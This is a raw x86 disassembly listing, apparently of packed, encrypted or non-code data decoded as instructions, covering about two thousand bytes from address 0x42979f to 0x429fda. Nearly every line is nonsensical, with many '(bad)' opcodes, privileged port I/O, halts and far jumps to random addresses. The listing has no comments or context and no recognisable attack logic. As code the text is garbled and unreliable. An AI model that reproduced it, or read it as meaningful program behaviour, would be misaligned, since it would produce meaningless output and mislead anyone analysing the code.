  42979f:	fadd   QWORD PTR [edi+ecx*1]
  4297a2:	jecxz  0x429768
  4297a4:	in     eax,0xe4
  4297a6:	jecxz  0x429784
  4297a8:	lods   eax,DWORD PTR ds:[esi]
  4297a9:	cmc    
  4297aa:	(bad)
  4297ad:	in     al,dx
  4297ae:	into   
  4297af:	sti    
  4297b0:	fmul   st,st(1)
  4297b2:	(bad)  
  4297b4:	fld    QWORD PTR [ebx]
  4297b6:	in     al,dx
  4297b7:	loop   0x429785
  4297b9:	shl    bl,cl
  4297bb:	rcr    ah,1
  4297bd:	out    0xfb,eax
  4297bf:	fcmovu st,st(5)
  4297c1:	pextrw edi,mm2,0xf0
  4297c5:	jmp    0xeee3:0xcfe0f2b7
  4297cc:	int3   
  4297cd:	(bad)  
  4297ce:	int    0xca
  4297d0:	repnz clc 
  4297d2:	jmp    0xbd048fb1
  4297d7:	fcom   st(2)
  4297d9:	fiadd  DWORD PTR ds:0x7e00409
  4297df:	enter  0xced5,0xa
  4297e3:	adc    ch,BYTE PTR [esp+edi*4-0x4a422f2f]
  4297ea:	aad    0xf0
  4297ec:	int3   
  4297ed:	int3   
  4297ee:	test   ah,0xd0
  4297f1:	cli    
  4297f2:	into   
  4297f3:	mov    edi,0xfef3f3f1
  4297f8:	in     eax,dx
  4297f9:	shl    ah,cl
  4297fb:	(bad)  
  4297fc:	fcomi  st,st(4)
  4297fe:	iret   
  4297ff:	dec    DWORD PTR [eax]
  429801:	add    al,0xe9
  429803:	(bad)  
  429804:	jmp    0xd3dc:0xbca8cfd3
  42980b:	hlt    
  42980c:	retf   0xaddf
  42980f:	mov    bh,0xb8
  429811:	rcr    bl,cl
  429813:	in     eax,dx
  429814:	sar    DWORD PTR [ebp-0x3e2b4009],cl
  42981a:	(bad)  
  42981b:	fimul  DWORD PTR [ecx]
  42981d:	(bad)  
  42981e:	enter  0xc9bc,0xd9
  429822:	retf   
  429823:	std    
  429824:	mov    edi,0xc7f7bdac
  429829:	jmp    0x429815
  42982b:	into   
  42982c:	div    BYTE PTR [ecx-0xe2e3605]
  429832:	in     eax,dx
  429833:	std    
  429834:	int3   
  429835:	shr    ch,0xe2
  429838:	dec    DWORD PTR [ebx]
  42983a:	stc    
  42983b:	jecxz  0x42981a
  42983d:	jmp    0xd9:0xbe9db04
  429844:	sar    BYTE PTR [edi+ecx*8-0x371c3c0d],0xd2
  42984c:	sar    cl,0xb7
  42984f:	repz mov edx,0xd2bcbad1
  429855:	fcmovnu st,st(6)
  429857:	shr    ebp,0xf0
  42985a:	(bad)  
  42985c:	mov    edi,0x5dfdac8
  429861:	cld    
  429862:	or     eax,0xe0e1d100
  429867:	loopne 0x42981c
  429869:	fcmovne st,st(4)
  42986b:	retf   0xb9d4
  42986e:	repnz (bad) [esi+0x1f6e8ba]
  429875:	xlat   BYTE PTR ds:[ebx]
  429876:	add    esi,esp
  429878:	cli    
  429879:	fadd   QWORD PTR [esp+ebx*8]
  42987c:	fdiv   st(0),st
  42987e:	retf   0x8fa
  429881:	or     eax,0xaaf2eece
  429886:	retf   
  429887:	loopne 0x42986a
  429889:	mov    esp,0xe4cdf2c4
  42988e:	shl    DWORD PTR [ebp+ecx*8+0x3bdd5ee],cl
  429895:	enter  0xfbdd,0xf1
  429899:	or     edi,esp
  42989b:	cli    
  42989c:	(bad)  
  42989d:	sti    
  42989e:	in     eax,0x6
  4298a0:	in     al,0xea
  4298a2:	out    dx,al
  4298a3:	icebp  
  4298a4:	mov    dl,0xdc
  4298a6:	jecxz  0x429876
  4298a8:	jmp    0x429877
  4298aa:	ret    
  4298ab:	mov    dl,0xc8
  4298ad:	mov    ah,0xe5
  4298af:	(bad)
  4298b2:	(bad)  
  4298b4:	aad    0xf7
  4298b6:	(bad)  
  4298b7:	fnsetpm(287 only) 
  4298b9:	or     esp,esi
  4298bb:	std    
  4298bc:	or     ebp,edi
  4298be:	out    dx,al
  4298bf:	or     esp,esp
  4298c1:	retf   
  4298c2:	or     eax,0xcde8b1e2
  4298c7:	mov    esp,0xe1fae8e0
  4298cc:	sar    edx,1
  4298ce:	mov    eax,0xfec9b6d6
  4298d3:	sti    
  4298d4:	int3   
  4298d5:	shl    eax,1
  4298d7:	(bad)  
  4298d9:	jecxz  0x4298d5
  4298db:	fild   DWORD PTR [ecx+ecx*1]
  4298de:	call   0xc444a8be
  4298e3:	jmp    0xc7d0:0xb0addce2
  4298ea:	int3   
  4298eb:	enter  0xaef8,0xd7
  4298ef:	fcmovnu st,st(4)
  4298f1:	neg    ch
  4298f3:	add    edi,edi
  4298f5:	jecxz  0x4298cd
  4298f7:	mov    ebp,0xfad4baec
  4298fc:	ret    
  4298fd:	or     ah,dl
  4298ff:	leave  
  429900:	fsqrt  
  429902:	add    ebx,esi
  429904:	shl    BYTE PTR [esi-0x2a48383c],1
  42990a:	mov    ebx,0xd8fbcbe9
  42990f:	mov    ebx,0xbdbecdd3
  429914:	fdivr  QWORD PTR [ebx+eiz*8-0x342a2339]
  42991b:	fcomp  st(5)
  42991d:	push   es
  42991e:	fucom  st(1)
  429920:	into   
  429921:	in     al,0xdb
  429923:	loopne 0x429911
  429925:	lock rcl ebx,cl
  429928:	int3   
  429929:	int    0xd1
  42992b:	loop   0x429919
  42992d:	cmc    
  42992e:	repz fucomp st(0)
  429931:	in     eax,dx
  429932:	hlt    
  429933:	add    bh,ah
  429935:	xlat   BYTE PTR ds:[ebx]
  429936:	(bad)  
  429938:	std    
  429939:	mov    esp,0xf5f4bcc2
  42993e:	aam    0xd8
  429940:	clc    
  429941:	leave  
  429942:	or     al,0xe0
  429944:	shr    DWORD PTR [ebp-0x550b161f],cl
  42994a:	out    dx,al
  42994b:	mov    dl,0xf2
  42994d:	fyl2x  
  42994f:	xlat   BYTE PTR ds:[ebx]
  429950:	hlt    
  429951:	into   
  429952:	repnz int 0xec
  429955:	in     al,dx
  429956:	add    al,BYTE PTR [esi]
  429958:	in     eax,dx
  429959:	rcl    ah,0xc0
  42995c:	call   0xd03a9a65
  429961:	retf   
  429962:	fcmovu st,st(6)
  429964:	ffree  st(4)
  429966:	mov    edi,0xb3d7b7f0
  42996b:	retf   
  42996c:	mov    edx,0xf3e4b1e5
  429971:	jmp    0xcd247569
  429976:	cld    
  429977:	int3   
  429978:	sar    DWORD PTR [ebx+eax*8-0x3fff24],0x0
  429980:	(bad)  
  429981:	jmp    0xc6c8:0xcfaccceb
  429988:	aam    0xe8
  42998a:	mov    dh,0xb0
  42998c:	scas   eax,DWORD PTR es:[edi]
  42998d:	fdiv   DWORD PTR [edi-0x7283a42]
  429993:	cmc    
  429994:	loop   0x42998b
  429996:	repz (bad) 
  429998:	in     al,0xbe
  42999a:	out    0xe7,eax
  42999c:	fst    st(4)
  42999e:	jmp    0xcf519b8e
  4299a3:	clc    
  4299a4:	loope  0x429958
  4299a6:	rol    esi,0xe0
  4299a9:	in     eax,0xd5
  4299ab:	jmp    0x429963
  4299ad:	mov    bh,0xe9
  4299af:	cmc    
  4299b0:	fsubr  st,st(2)
  4299b2:	jmp    0xe0d2:0xc0eeb7b4
  4299b9:	xlat   BYTE PTR ds:[ebx]
  4299ba:	rol    ecx,cl
  4299bc:	add    eax,0xeddd05f6
  4299c1:	(bad)  
  4299c2:	fiadd  DWORD PTR [edi]
  4299c4:	out    0xea,al
  4299c6:	xlat   BYTE PTR ds:[ebx]
  4299c7:	call   0xec0a6faf
  4299cc:	mov    ah,0xba
  4299ce:	hlt    
  4299cf:	mov    edx,0xfcbed8f7
  4299d4:	mov    ecx,0xd4f1e7e7
  4299d9:	mov    ah,0xca
  4299dc:	cld    
  4299dd:	retf   0x7ca
  4299e0:	or     BYTE PTR [esi],cl
  4299e2:	jmp    esi
  4299e4:	fpatan 
  4299e6:	int3   
  4299e7:	(bad)  
  4299e8:	fst    st(6)
  4299ea:	iret   
  4299eb:	shl    cl,1
  4299ed:	repnz (bad) 
  4299ef:	fsub   st,st(4)
  4299f1:	into   
  4299f2:	shl    ecx,cl
  4299f4:	repnz jecxz 0x4299e4
  4299f7:	aad    0xd6
  4299f9:	(bad)
  4299fc:	ret    
  4299fd:	(bad)  
  429a00:	jmp    0x4299dd
  429a02:	(bad)  
  429a03:	out    dx,al
  429a04:	mov    cl,0xc9
  429a06:	(bad)  
  429a07:	jmp    0x4299fb
  429a09:	(bad)  
  429a0a:	neg    edx
  429a0c:	rcr    al,cl
  429a0e:	fidiv  WORD PTR [esi-0x33361c13]
  429a14:	mov    ebp,0xd0eff0
  429a19:	mov    edx,0xdb0bd105
  429a1e:	cmc    
  429a1f:	aam    0xe6
  429a21:	vpsubsb ymm5,ymm6,ymm4
  429a25:	mov    eax,0xc4cad3f7
  429a2a:	loope  0x4299fb
  429a2c:	leave  
  429a2d:	(bad)  
  429a2e:	imul   ecx
  429a30:	mov    ecx,0xecd1dffb
  429a35:	loope  0x4299f6
  429a37:	mov    ebp,0xfbf6d6ff
  429a3c:	std    
  429a3d:	fiadd  DWORD PTR [esi]
  429a3f:	fsub   st(7),st
  429a41:	sti    
  429a42:	in     al,0xe8
  429a44:	out    0xcf,al
  429a46:	icebp  
  429a47:	rcl    cl,cl
  429a49:	loop   0x429a1c
  429a4b:	rcl    ebp,cl
  429a4d:	(bad)  
  429a4f:	mov    bh,0xff
  429a51:	cmc    
  429a52:	lock rcl ebp,cl
  429a55:	(bad)  
  429a57:	hlt    
  429a58:	int3   
  429a59:	faddp  st(3),st
  429a5b:	hlt    
  429a5c:	fiadd  WORD PTR ds:0x3ffef07
  429a62:	in     al,dx
  429a63:	or     DWORD PTR [eax-0x2c38370f],ebp
  429a69:	shr    al,cl
  429a6b:	mov    al,0xf9
  429a6d:	mov    eax,0xf4daebf0
  429a72:	shl    ebx,1
  429a74:	(bad)  
  429a76:	out    dx,eax
  429a77:	test   BYTE PTR [ecx+esi*8],0xe2
  429a7b:	add    eax,0xc6c5c8f7
  429a80:	retf   0x5d9
  429a83:	shl    DWORD PTR [ebx-0x2b4e1442],cl
  429a89:	mov    cl,0xa9
  429a8b:	in     al,0xd5
  429a8d:	leave  
  429a8e:	mov    edi,0xdcf4f4b9
  429a93:	jecxz  0x429a68
  429a95:	loop   0x429a98
  429a97:	add    dl,dl
  429a99:	cli    
  429a9a:	cmc    
  429a9b:	rcr    edx,1
  429a9d:	enter  0xf601,0xe0
  429aa1:	out    dx,al
  429aa2:	jecxz  0x429aa2
  429aa4:	shl    ebx,cl
  429aa6:	rcl    edx,0xcd
  429aa9:	out    0xb3,al
  429aab:	test   al,0xb0
  429aad:	in     eax,dx
  429aae:	in     al,dx
  429aaf:	xlat   BYTE PTR ds:[ebx]
  429ab0:	in     al,0xd2
  429ab2:	add    al,bl
  429ab4:	int    0xec
  429ab6:	cmc    
  429ab7:	cli    
  429ab8:	repnz stc 
  429aba:	fcmovnbe st,st(6)
  429abc:	fstp   TBYTE PTR [esi-0x1c270b1d]
  429ac2:	add    ebx,esi
  429ac4:	retf   0xc2c0
  429ac7:	enter  0xc0ec,0xf5
  429acb:	cli    
  429acc:	clc    
  429acd:	in     al,dx
  429ace:	(bad)  
  429acf:	lock jmp 0x429a86
  429ad2:	jecxz  0x429a8e
  429ad4:	in     eax,dx
  429ad5:	inc    DWORD PTR [edx]
  429ad7:	in     eax,0xdb
  429ad9:	rcl    edx,0xf9
  429adc:	or     dh,dh
  429ade:	out    dx,eax
  429adf:	test   ch,0xe0
  429ae2:	stc    
  429ae3:	in     al,0xed
  429ae5:	mov    al,0xdc
  429ae7:	icebp  
  429ae8:	lods   eax,DWORD PTR ds:[esi]
  429ae9:	hlt    
  429aea:	shl    cl,cl
  429aec:	call   0xf10d82e7
  429af1:	clc    
  429af2:	enter  0xd1dd,0xf1
  429af6:	add    eax,DWORD PTR [ebx]
  429af8:	div    ebp
  429afa:	in     eax,0xde
  429afc:	leave  
  429afd:	imul   dl
  429aff:	(bad)
  429b02:	int    0x0
  429b04:	test   eax,0xddd6d6ef
  429b09:	mov    ch,0xf6
  429b0b:	rol    edi,1
  429b0d:	mov    al,0xf7
  429b0f:	jmp    0xf7f8:0xeaf8ceff
  429b16:	add    edx,edx
  429b18:	mov    esi,0xd9eadcf3
  429b1d:	or     dl,bl
  429b1f:	or     ebx,esp
  429b21:	stc    
  429b22:	out    0xc,al
  429b24:	fnstenv [edx-0x111b3921]
  429b2a:	int    0xee
  429b2c:	scas   eax,DWORD PTR es:[edi]
  429b2d:	(bad)  
  429b2e:	call   0xf8365925
  429b33:	int3   
  429b34:	test   DWORD PTR [ebx],0xd8d000be
  429b3a:	fsin   
  429b3c:	or     BYTE PTR [eax+eax*8],al
  429b3f:	out    dx,eax
  429b40:	(bad)  
  429b41:	fmul   st(0),st
  429b43:	psrld  mm5,mm7
  429b46:	lods   eax,DWORD PTR ds:[esi]
  429b47:	(bad)  
  429b48:	test   edi,0xebd0e5f2
  429b4e:	in     eax,dx
  429b4f:	out    0xd8,al
  429b51:	sti    
  429b52:	shl    esi,1
  429b54:	mov    edi,0xe700cff5
  429b59:	lock sti 
  429b5b:	inc    esp
  429b5d:	cld    
  429b5e:	stc    
  429b5f:	pop    es
  429b60:	or     bl,bh
  429b62:	(bad)  
  429b64:	out    0xbf,al
  429b66:	mov    bh,0xa8
  429b68:	(bad)  
  429b69:	shl    DWORD PTR [eax-0x2c34453c],1
  429b6f:	jmp    0x429b4c
  429b71:	out    dx,eax
  429b72:	jmp    0x429b4c
  429b74:	std    
  429b75:	mov    ebp,0xf6c0dbee
  429b7a:	shl    al,1
  429b7c:	leave  
  429b7d:	loope  0x429b88
  429b7f:	mov    esp,0xd8c4d902
  429b84:	ret    0xdfcf
  429b87:	leave  
  429b88:	mov    al,0xeb
  429b8a:	mov    dh,0xcc
  429b8c:	clc    
  429b8d:	loopne 0x429b63
  429b8f:	les    edi,FWORD PTR [ecx-0x9443532]
  429b95:	lock mov ebp,0xebe5eccc
  429b9b:	aam    0xfe
  429b9d:	retf   
  429b9e:	por    mm0,QWORD PTR [ecx]
  429ba1:	jmp    0xe7f06785
  429ba6:	(bad)  
  429ba7:	leave  
  429ba8:	stos   DWORD PTR es:[edi],eax
  429ba9:	fcomi  st,st(1)
  429bab:	hlt    
  429bac:	icebp  
  429bad:	mov    edx,0xd8daf9ea
  429bb2:	icebp  
  429bb3:	fcomp  st(5)
  429bb5:	mov    edi,0xbce6e7de
  429bba:	shl    bl,1
  429bbc:	fcmovnb st,st(0)
  429bbe:	pmulhw mm5,mm6
  429bc1:	add    eax,0xd2f00fc5
  429bc6:	repnz test ebx,0xb6b6e9eb
  429bcd:	out    dx,al
  429bce:	mov    ah,0xf3
  429bd0:	repz mov ebx,0xc3eec3d2
  429bd6:	mov    ebp,0xc5dffce2
  429bdb:	add    esi,ebx
  429bdd:	jmp    0xc52458d1
  429be2:	out    0xe9,al
  429be4:	mov    edi,0xbceabdb0
  429be9:	lods   eax,DWORD PTR ds:[esi]
  429bea:	jecxz  0x429bd0
  429bec:	rcr    ecx,cl
  429bee:	out    dx,eax
  429bef:	fstp   st(3)
  429bf1:	fcomip st,st(2)
  429bf3:	repz mov ebp,0xf3d506cd
  429bf9:	in     al,0xf0
  429bfb:	cmc    
  429bfc:	(bad)  
  429bfd:	jecxz  0x429bd7
  429bff:	out    0x0,eax
  429c01:	(bad)  
  429c03:	repnz test al,0xaa
  429c06:	jmp    0x429bc9
  429c08:	mov    dh,0xc4
  429c0a:	out    0xe0,eax
  429c0c:	out    dx,al
  429c0d:	aad    0xd9
  429c0f:	div    ebx
  429c11:	fucomp st(6)
  429c13:	(bad)  
  429c14:	jecxz  0x429bd0
  429c16:	stc    
  429c17:	fdivr  st,st(6)
  429c19:	out    0xc5,al
  429c1b:	xlat   BYTE PTR ds:[ebx]
  429c1c:	mov    DWORD PTR [edi],0x1fefd02
  429c22:	or     edi,esp
  429c24:	jecxz  0x429c06
  429c26:	lods   eax,DWORD PTR ds:[esi]
  429c27:	in     eax,dx
  429c28:	int    0xcc
  429c2a:	int3   
  429c2b:	retf   
  429c2c:	aad    0xc9
  429c2e:	icebp  
  429c2f:	mov    eax,0xf7d0f0d5
  429c34:	fsubp  st(0),st
  429c36:	std    
  429c37:	repz icebp 
  429c39:	aad    0xf4
  429c3b:	jmp    0xedc7:0xe8d5bec9
  429c42:	(bad)  
  429c44:	fucom  st(6)
  429c46:	retf   0xe4c2
  429c49:	ret    
  429c4a:	retf   
  429c4b:	retf   0xd0da
  429c4e:	(bad)  
  429c50:	rcl    ch,1
  429c52:	mov    ah,0xe8
  429c54:	add    ch,dh
  429c56:	loop   0x429c26
  429c58:	rcr    esp,0x4
  429c5b:	stc    
  429c5c:	retf   0xc1db
  429c5f:	(bad)  
  429c60:	fimul  DWORD PTR [ecx]
  429c62:	add    ebp,edi
  429c64:	in     al,0xf7
  429c66:	in     eax,dx
  429c67:	enter  0xd7cd,0xe6
  429c6b:	icebp  
  429c6c:	cli    
  429c6d:	call   0xeaf98c61
  429c72:	aam    0xdf
  429c74:	add    al,al
  429c76:	add    esp,ecx
  429c78:	add    bh,BYTE PTR [esi-0x93f0101]
  429c7e:	add    dh,bh
  429c80:	add    eax,0xcd06fd01
  429c85:	fsub   st,st(4)
  429c87:	fsubr  st(4),st
  429c89:	lods   eax,DWORD PTR ds:[esi]
  429c8a:	shr    BYTE PTR [ecx+edx*8-0x4a141852],cl
  429c91:	in     al,0xd9
  429c93:	mov    esi,0xfaefbfd2
  429c98:	xlat   BYTE PTR ds:[ebx]
  429c99:	mov    ebp,0xbe07d0f0
  429c9e:	shufps xmm1,xmm0,0xc9
  429ca2:	inc    BYTE PTR [ebx]
  429ca4:	in     al,0xd3
  429ca6:	in     al,dx
  429ca7:	icebp  
  429ca8:	cmc    
  429ca9:	mul    ebx
  429cab:	(bad)  [ebx+ecx*8-0x2e49190d]
  429cb2:	sar    cl,cl
  429cb4:	mov    ecx,0xe2dfe7ee
  429cb9:	(bad)  
  429cbb:	jmp    edi
  429cbd:	jmp    0xc9db:0xf306fee7
  429cc4:	(bad)  
  429cc5:	mov    cl,0xaf
  429cc7:	ret    
  429cc8:	cmc    
  429cc9:	mov    dl,0xd1
  429ccb:	xlat   BYTE PTR ds:[ebx]
  429ccc:	mov    ch,0xb0
  429cce:	mov    eax,0xd2b4d5f0
  429cd3:	rcl    eax,1
  429cd5:	iret   
  429cd6:	aad    0xcc
  429cd8:	rol    DWORD PTR [eax],1
  429cda:	pop    es
  429cdb:	or     esi,edi
  429cdd:	ret    0xe4fc
  429ce0:	(bad)
  429ce3:	fcomp  st(5)
  429ce5:	jecxz  0x429caf
  429ce7:	int    0xc5
  429ce9:	hlt    
  429cea:	mov    al,0xc4
  429cec:	icebp  
  429ced:	(bad)  
  429cee:	cli    
  429cef:	out    0xc4,al
  429cf1:	aad    0xfb
  429cf3:	(bad)  
  429cf4:	(bad)  
  429cf5:	mov    ecx,0xdebddad4
  429cfa:	shl    ch,cl
  429cfc:	xlat   BYTE PTR ds:[ebx]
  429cfd:	loopne 0x429cd6
  429cff:	dec    BYTE PTR [edi]
  429d01:	in     al,0xe
  429d03:	in     eax,0xd9
  429d05:	lods   al,BYTE PTR ds:[esi]
  429d06:	mov    al,0xac
  429d08:	aam    0xe1
  429d0a:	enter  0xfbf1,0xce
  429d0e:	mov    ch,0xd3
  429d10:	jmp    0xfde0:0xbad5ecea
  429d17:	sti    
  429d18:	fadd   st(6),st
  429d1a:	lock or ecx,edx
  429d1d:	leave  
  429d1e:	cli    
  429d1f:	retf   0xc90e
  429d22:	rcr    eax,cl
  429d24:	leave  
  429d25:	mul    edi
  429d27:	mov    esi,0xe6c6cbd0
  429d2c:	out    dx,eax
  429d2d:	shl    bh,cl
  429d2f:	(bad)  
  429d31:	mov    ch,0xfe
  429d33:	aam    0xfe
  429d35:	xlat   BYTE PTR ds:[ebx]
  429d36:	loop   0x429d24
  429d38:	(bad)  
  429d39:	loope  0x429d32
  429d3b:	in     eax,0xd1
  429d3d:	jmp    0x429d1e
  429d3f:	out    dx,al
  429d40:	fcos   
  429d42:	add    edx,edx
  429d44:	ret    0xb3e9
  429d47:	int    0xf6
  429d49:	fdivr  st(2),st
  429d4b:	(bad)  
  429d4c:	rcr    dl,0xe5
  429d4f:	div    dh
  429d51:	leave  
  429d52:	clc    
  429d53:	in     al,dx
  429d54:	int3   
  429d55:	(bad)  
  429d57:	mov    edi,0xc10104d3
  429d5c:	add    eax,0xdbdee2c4
  429d61:	clc    
  429d62:	inc    DWORD PTR [ebx]
  429d64:	retf   
  429d65:	repz (bad) 
  429d67:	jmp    0xd5057e2e
  429d6c:	leave  
  429d6d:	mov    ah,0xca
  429d6f:	jmp    0xeb0f5046
  429d74:	mov    esi,0xe6d603dc
  429d79:	add    al,0xdd
  429d7b:	out    0xc6,eax
  429d7d:	in     eax,0xc9
  429d7f:	jmp    0xda527a5f
  429d84:	iret   
  429d85:	ret    
  429d86:	jmp    0xb3c6:0xd2d7b5b1
  429d8d:	stc    
  429d8e:	(bad)  
  429d8f:	in     eax,dx
  429d90:	stc    
  429d91:	std    
  429d92:	aad    0xe9
  429d94:	fistp  QWORD PTR [edx-0x1a1cf920]
  429d9a:	(bad)  
  429d9b:	mov    ah,0xf4
  429d9e:	jmp    0x429d98
  429da0:	(bad)  
  429da1:	cld    
  429da2:	(bad)  
  429da4:	out    0xf2,al
  429da6:	leave  
  429da7:	in     eax,dx
  429da8:	xlat   BYTE PTR ds:[ebx]
  429da9:	shr    BYTE PTR [ebp-0x4e4f464b],0xb8
  429db0:	ror    ecx,cl
  429db2:	(bad)  
  429db4:	(bad)  
  429db5:	cli    
  429db6:	aad    0x3
  429db8:	fld    DWORD PTR [esi]
  429dba:	(bad)  
  429dbc:	cmc    
  429dbd:	out    dx,eax
  429dbe:	lds    ecx,FWORD PTR [esi]
  429dc0:	fcom   DWORD PTR [ebx]
  429dc2:	add    cl,BYTE PTR [eax]
  429dc4:	enter  0xc7ea,0xa8
  429dc8:	mov    bh,0xc7
  429dca:	rcl    dl,cl
  429dcc:	mov    bh,0xf3
  429dce:	enter  0xb5cf,0xea
  429dd2:	int    0x3
  429dd4:	(bad)  
  429dd6:	shr    ebp,cl
  429dd8:	add    ecx,esp
  429dda:	out    0xe3,eax
  429ddc:	in     eax,0xfc
  429dde:	(bad)  
  429de0:	(bad)  [edx]
  429de2:	push   es
  429de3:	retf   
  429de4:	stos   DWORD PTR es:[edi],eax
  429de5:	stos   BYTE PTR es:[edi],al
  429de6:	test   al,0xdc
  429de8:	shl    esi,0xcb
  429deb:	vpsubd ymm5,ymm6,ymm3
  429df0:	cld    
  429df1:	in     al,dx
  429df2:	call   ebp
  429df4:	(bad)  
  429df6:	stc    
  429df7:	clc    
  429df8:	(bad)  
  429dfa:	loop   0x429dfe
  429dfc:	add    eax,0xc5f409c0
  429e01:	add    eax,0xf7befde5
  429e06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e07:	vcmppd ymm2,ymm3,ymm0,0xc8
  429e0c:	jmp    0xc8ed:0xd1fff5ee
  429e13:	std    
  429e14:	fldln2 
  429e16:	add    bh,BYTE PTR [esi-0x8f93310]
  429e1c:	cmc    
  429e1d:	add    dl,bh
  429e1f:	std    
  429e20:	(bad)  
  429e22:	in     al,0xff
  429e24:	fpatan 
  429e26:	retf   0xb2ea
  429e29:	mov    bl,0xe3
  429e2b:	shl    DWORD PTR [esp+esi*4-0x3000707],0xcc
  429e33:	into   
  429e34:	ret    
  429e35:	out    dx,al
  429e36:	std    
  429e37:	mov    eax,0x105c4ff
  429e3c:	sti    
  429e3d:	loop   0x429e25
  429e3f:	out    0xd4,eax
  429e41:	add    al,0x9
  429e43:	or     cl,al
  429e45:	out    dx,al
  429e46:	mov    bh,0xee
  429e48:	out    0xb7,eax
  429e4a:	mov    ch,0xc6
  429e4c:	out    0xea,eax
  429e4e:	iret   
  429e4f:	(bad)  
  429e51:	jmp    0x429e36
  429e53:	loop   0x429e23
  429e55:	add    dh,cl
  429e57:	rol    edi,cl
  429e59:	cli    
  429e5a:	out    0xe3,al
  429e5c:	(bad)  
  429e5d:	jmp    0xcc227851
  429e62:	fild   WORD PTR [esp+eax*8]
  429e65:	enter  0xeeca,0xcb
  429e69:	in     eax,0xcf
  429e6b:	ret    0xb8d9
  429e6e:	fsubp  st(7),st
  429e70:	iret   
  429e71:	clc    
  429e72:	idiv   cl
  429e74:	ret    0xf2f4
  429e77:	into   
  429e78:	aam    0xcc
  429e7a:	loop   0x429e57
  429e7c:	leave  
  429e7d:	out    0xdd,eax
  429e7f:	aad    0xfc
  429e81:	into   
  429e82:	fld    st(0)
  429e84:	shl    al,1
  429e86:	fsubr  st(1),st
  429e88:	loope  0x429e6c
  429e8a:	mov    bh,0xd7
  429e8c:	jmp    0xe6416f76
  429e91:	add    ebx,esi
  429e93:	hlt    
  429e94:	rol    ecx,0xf3
  429e97:	fdivr  st(7),st
  429e99:	add    bh,BYTE PTR [ebp+0x5d7c2bc]
  429e9f:	(bad)  
  429ea0:	sti    
  429ea1:	or     BYTE PTR [ecx],al
  429ea3:	loop   0x429e93
  429ea5:	lods   al,BYTE PTR ds:[esi]
  429ea6:	mov    dl,0xed
  429ea8:	into   
  429ea9:	xlat   BYTE PTR ds:[ebx]
  429eaa:	mov    ch,0xf3
  429eac:	(bad)
  429eaf:	int3   
  429eb0:	(bad)  
  429eb2:	fdiv   DWORD PTR [eax-0x3c2d0243]
  429eb8:	sti    
  429eb9:	in     eax,0x4
  429ebb:	or     ebx,ecx
  429ebd:	jmp    0x429ec6
  429ebf:	jmp    0xe1366bcc
  429ec4:	(bad)  
  429ec6:	retf   0xc9b6
  429ec9:	ret    
  429eca:	test   eax,0xb7e8ccc0
  429ecf:	out    0xbd,al
  429ed1:	mov    eax,0xfbcefefb
  429ed6:	clc    
  429ed7:	mov    ebp,0xc6d5e2d6
  429edc:	rcr    esp,1
  429ede:	loope  0x429ecd
  429ee0:	or     cl,ah
  429ee2:	out    0xe2,eax
  429ee4:	shl    bh,cl
  429ee6:	loopne 0x429ed4
  429ee8:	out    0xb0,eax
  429eea:	loope  0x429e9f
  429eec:	hlt    
  429eed:	mov    dl,0xbf
  429eef:	mov    edx,0xfbf0cee8
  429ef4:	iret   
  429ef5:	aam    0xcc
  429ef7:	in     eax,dx
  429ef8:	stc    
  429ef9:	(bad)  
  429efb:	lock (bad) 
  429efd:	jmp    ebx
  429eff:	rcr    dh,0xd9
  429f02:	add    al,0x3
  429f04:	test   al,0xac
  429f06:	enter  0xc7d5,0xc2
  429f0a:	in     al,dx
  429f0b:	loopne 0x429ee3
  429f0d:	jmp    0xf0fe:0xe4fae8b5
  429f14:	loop   0x429f11
  429f16:	(bad)  
  429f17:	mov    esi,0xc7daec07
  429f1c:	pop    es
  429f1d:	invd   
  429f1f:	jmp    0x429f00
  429f21:	enter  0xffc1,0xaf
  429f25:	retf   0xc9f7
  429f28:	scas   al,BYTE PTR es:[edi]
  429f29:	hlt    
  429f2a:	lods   eax,DWORD PTR ds:[esi]
  429f2b:	retf   
  429f2c:	loope  0x429f19
  429f2e:	(bad)  
  429f2f:	into   
  429f30:	leave  
  429f31:	aam    0xee
  429f33:	mov    al,0x1
  429f35:	out    0xe1,eax
  429f37:	add    DWORD PTR [ebx],eax
  429f39:	repz (bad) 
  429f3b:	fild   DWORD PTR [esi]
  429f3d:	leave  
  429f3e:	hlt    
  429f3f:	fdiv   st(6),st
  429f41:	into   
  429f42:	adc    ecx,DWORD PTR [ebx]
  429f44:	jmp    0xacd0:0xd2ddf2dc
  429f4b:	mov    ch,0xda
  429f4d:	(bad)  
  429f4e:	retf   
  429f4f:	hlt    
  429f50:	sar    dl,cl
  429f52:	fdivr  QWORD PTR [eax-0x470e2f41]
  429f58:	(bad)  
  429f59:	fdivp  st(3),st
  429f5b:	neg    edx
  429f5d:	add    ebx,esi
  429f5f:	into   
  429f60:	loope  0x429f4d
  429f62:	movntq QWORD PTR [ebp-0x18222d54],mm7
  429f69:	int    0xb5
  429f6b:	mov    ah,0xf2
  429f6d:	les    esi,FWORD PTR [eax-0x22300546]
  429f73:	mov    ebp,0xd0dfb600
  429f78:	add    eax,esp
  429f7a:	push   es
  429f7b:	stc    
  429f7c:	xlat   BYTE PTR ds:[ebx]
  429f7d:	std    
  429f7e:	fcmovnbe st,st(5)
  429f80:	fcmovne st,st(5)
  429f82:	int3   
  429f83:	stc    
  429f84:	scas   al,BYTE PTR es:[edi]
  429f85:	shr    al,cl
  429f87:	vpaddsw xmm4,xmm6,xmm1
  429f8b:	out    0xf5,eax
  429f8d:	fcmovu st,st(2)
  429f8f:	in     al,0xd5
  429f91:	sar    DWORD PTR [eax-0xf031e2e],1
  429f97:	clc    
  429f98:	loop   0x429f9b
  429f9a:	fxch   st(2)
  429f9c:	in     eax,0xf4
  429f9e:	out    dx,al
  429f9f:	jecxz  0x429f6b
  429fa1:	or     BYTE PTR [eax],al
  429fa3:	or     al,dh
  429fa5:	in     eax,0xf2
  429fa7:	jmp    0xe60b6692
  429fac:	mov    cl,0xef
  429fae:	(bad)  
  429fb0:	repz in al,dx
  429fb2:	iret   
  429fb3:	mov    esi,0xf1d100e3
  429fb8:	loop   0x429fba
  429fba:	sti    
  429fbb:	add    eax,edi
  429fbd:	jecxz  0x429fc2
  429fbf:	jmp    0x429fa5
  429fc1:	sti    
  429fc2:	add    eax,0xcbbfbfcf
  429fc7:	(bad)  
  429fc8:	out    dx,al
  429fc9:	out    dx,eax
  429fca:	mov    bh,0xec
  429fcc:	out    0xb0,eax
  429fce:	sar    DWORD PTR [esi-0x474d23],1
  429fd4:	shl    dl,1
  429fd6:	shl    dl,1
  429fd8:	stc    
  429fd9:	cmc    
  429fda:	out    0xc6,al
